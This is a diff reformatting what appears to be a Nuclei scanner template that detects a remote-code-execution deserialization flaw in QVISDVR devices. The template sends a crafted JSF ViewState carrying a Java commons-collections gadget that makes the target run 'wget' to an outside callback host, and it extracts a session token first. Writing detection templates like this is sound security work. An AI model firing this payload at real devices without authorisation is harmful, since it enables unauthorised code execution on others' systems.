@@ -1,52 +1,56 @@
 id: qvisdvr-deserialization-rce
-
 info:
   name: QVISDVR JSF Deserialization - Remote Code Execution
   author: me9187
   severity: critical
-  description: |
-    QVISDVR Java-Deserialization was discovered, which could allow remote code execution.
+  description: The QVISDVR JSF Deserialization vulnerability permits attackers to
+    execute arbitrary code remotely.
   reference:
-    - https://twitter.com/Me9187/status/1414606876575162373
+  - https://twitter.com/Me9187/status/1414606876575162373
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: qvisdvr,rce,deserialization,jsf,iot
-
+  metadata:
+    impact: The discovery of QVISDVR Java-Deserialization had a significant impact
+      as it could potentially lead to remote code execution.
+    recommendation: It is strongly recommended to update to the latest version of
+      QVISDVR to prevent potential remote code execution.
 requests:
-  - raw:
-      - |
-        GET /qvisdvr/ HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+- raw:
+  - 'GET /qvisdvr/ HTTP/1.1
 
-      - |
-        POST /qvisdvr/index.faces;jsessionid={{token}} HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+    Host: {{Hostname}}
 
-        javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
+    Content-Type: application/x-www-form-urlencoded
 
-    extractors:
-      - type: regex
-        name: token
-        group: 1
-        internal: true
-        part: header
-        regex:
-          - "JSESSIONID=(.*)"
+    '
+  - 'POST /qvisdvr/index.faces;jsessionid={{token}} HTTP/1.1
 
-    matchers-condition: and
-    matchers:
+    Host: {{Hostname}}
 
-      - type: word
-        part: interactsh_protocol
-        words:
-          - http
+    Content-Type: application/x-www-form-urlencoded
 
-      - type: status
-        status:
-          - 500
 
-# Enhanced by mp on 2022/05/19
+    javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}",
+    "base64")}}
+
+    '
+  extractors:
+  - type: regex
+    name: token
+    group: 1
+    internal: true
+    part: header
+    regex:
+    - JSESSIONID=(.*)
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - http
+  - type: status
+    status:
+    - 500
